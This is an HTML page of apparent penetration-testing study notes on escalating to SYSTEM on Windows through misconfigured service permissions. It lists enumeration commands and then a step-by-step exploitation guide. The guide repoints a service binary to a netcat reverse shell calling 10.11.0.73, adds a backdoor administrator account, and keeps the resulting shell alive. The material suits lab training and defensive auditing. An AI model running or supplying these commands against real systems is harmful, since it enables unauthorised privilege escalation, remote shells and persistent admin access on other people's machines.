<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Service Permissions</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Incorrect Service Permissions</h1></strong><br />A service running as Administrator/SYSTEM with incorrect file permissions - one&#39;s that allow you access to it - can potentially be used for escalation of privilege: you could replace the binary, restart the service, and get SYSTEM.<br /><br /><strong>Links</strong><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---incorrect-permissions-in-services">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---incorrect-permissions-in-services</a><br />• <a href="https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services">https://guif.re/windowseop#EoP%201:%20Incorrect%20permissions%20in%20services</a><br />• <a href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a> - <em>Roll up your sleeves</em> section<br /><br />Often, services are pointing to writeable locations:<br />• Orphaned installs, not installed anymore but still exist in startup<br />• DLL Hijacking<br />• PATH directories with weak permissions<br /><br />Metasploit module - <code>exploit/windows/local/service_permissions</code><br /><br /><strong><h2>## Check service permissions</h2></strong><br />In the service permissions, you&#39;re looking for:<br />• <code>BUILTIN\Users:(F)</code> (Full access)<br />• <code>BUILTIN\Users:(M)</code> (Modify access)<br />• <code>BUILTIN\Users:(W)</code> (Write-only access)<br />   ◇ More info on service permissions - <a href="https://msdn.microsoft.com/en-us/library/bb727008.aspx">https://msdn.microsoft.com/en-us/library/bb727008.aspx</a><br /><br /><strong><h3>### accesschk.exe</h3></strong><br />• Made by Sysinternals<br />• For Windows XP, you need accesschk version 5.2<br />• Requires dropping a binary to the system (not stealthy)<br />• Have to type <code>/accepteula</code> to prevent window popup to user<br />• Download:<br />   ◇ Sysinternals - <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a><br />   ◇ 5.2 / XP version provided by phackt - <a href="https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe">https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe</a><br /><br /><strong>Check permissions</strong><br /><code>accesschk.exe -uwcqv * /accepteula</code> - all services<br /><code>accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula</code> - check for &quot;Authenticated User&quot; access as low privilege user<br /><br /><strong>Check permissions for specific service</strong><br /><code>accesschk.exe -ucqv upnphost /accepteula</code><br /><br /><strong><h3>### wmic</h3></strong><br />• Probably not available on XP systems<br />• This is a weird command<br /><br />List potentially vulnerable services:<br />1. <br /><code>for /f &quot;tokens=2 delims=&#39;=&#39;&quot; %a in (&#39;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&#39;) do @echo %a &gt;&gt; c:\windows\temp\permissions.txt</code><br /><br />2.<br /><code>for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;</code><br /><br /><strong>### sc</strong><br />• More weird for loop stuff<br /><br />1. <code>sc query state=all | findstr &quot;SERVICE_NAME:&quot; &gt;&gt; Servicenames.txt</code><br />2. <code>FOR /F %i in (Servicenames.txt) DO echo %i</code><br />3. <code>type Servicenames.txt</code><br />4. <code>FOR /F &quot;tokens=2 delims= &quot; %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt</code><br />5. <code>FOR /F %i in (services.txt) DO @sc qc %i | findstr &quot;BINARY_PATH_NAME&quot; &gt;&gt; path.txt</code><br /><br /><strong>### </strong><strong><h3>cacls/icacls</h3></strong><br />• Can manually check services using cacls or icacls<br />   ◇ <code>cacls</code> = Windows XP<br />   ◇ <code>icacls</code> = Windows Vista +<br /><br /><code>cacls &quot;C:\path\to\file.exe&quot;</code><br /><br /><strong><h2>## Edit Permissions &amp; Exploit</h2></strong><br />If you&#39;ve found a service that you have permissions, you can try to exploit it.<br /><br /><strong><h3>### Payload / Exploit Ideas</h3></strong><br />• Replace the service binary with a reverse shell<br />• Replace the service binary with a command that creates a new user and adds it to the Administrator group<br /><br /><strong><h3>### Tips</h3></strong><br />• WHEN MODIFYING SERVICE SETTINGS<br />   ◇ the space in <code>argument= &quot;&lt;setting&gt;&quot;</code> IS CRUCIAL<br />   ◇ the config change will fail without it<br />      ▪ This is true on Windows XP SP1 at least<br />• If you&#39;re getting a shell, THE SHELL MIGHT DIE AFTER 30 SECONDS<br />   ◇ if you&#39;re in a metasploit meterpreter shell? migrate to a new process<br />   ◇ if you&#39;re in a normal shell? from within that shell, execute a 2nd reverse shell to a 2nd listener<br />      ▪ that 2nd shell won&#39;t die because its process isn&#39;t tied to the service<br /><br /><strong><h3>### How-to</h3></strong><br />1. Check current service settings<br /><code>sc qc &lt;service&gt;</code><br /><br />2. Edit binary parth (in this example, to a reverse shell)<br /><code>sc config upnphost binpath= &quot;C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe&quot;</code><br /><br /><code>sc config upnphost binpath= &quot;cmd /c net user bird Bird123! /add &amp;&amp; net localgroup administrators bird /add &amp;&amp; net localgroup &#39;Remote Desktop Users&#39; /add&quot;</code><br /><br />3. Edit service to run as SYTSEM (I think?)<br /><code>sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</code><br /><br />4. Check service settings again (your changes should have gone through)<br /><code>sc qc upnphost</code><br /><br />5. Stop and start service<br /><code>net stop upnphost</code><br /><code>net start upnphost</code><br />or<br /><code>sc stop upnphost<br />sc start upnphost</code><br />or<br /><code>wmic service &lt;service&gt; call startservice</code><br /><br />You should have a shell :)<br />THE SHELL MIGHT DIE AFTER 30 SECONDS<br />• If this is the case:<br />   ◇ in metasploit? migrate to a new process<br />   ◇ normal shell? just execute a 2nd reverse shell to a 2nd listener<br />      ▪ that 2nd shell won&#39;t die because its process isn&#39;t tied to the service<br /><br /><strong><h3>### Fails because of dependency</h3></strong><br />If the service fails because of it needs a depedency,<br />try the following:<br /><code>sc config SSDPSRV start= auto<br />net start SSDPSRV<br />net start upnphost</code><br /><br />Or try removing the dependency altogether:<br /><code>sc config upnphost depend= &quot;&quot;</code><br /><br /></div>
</body>
</html>
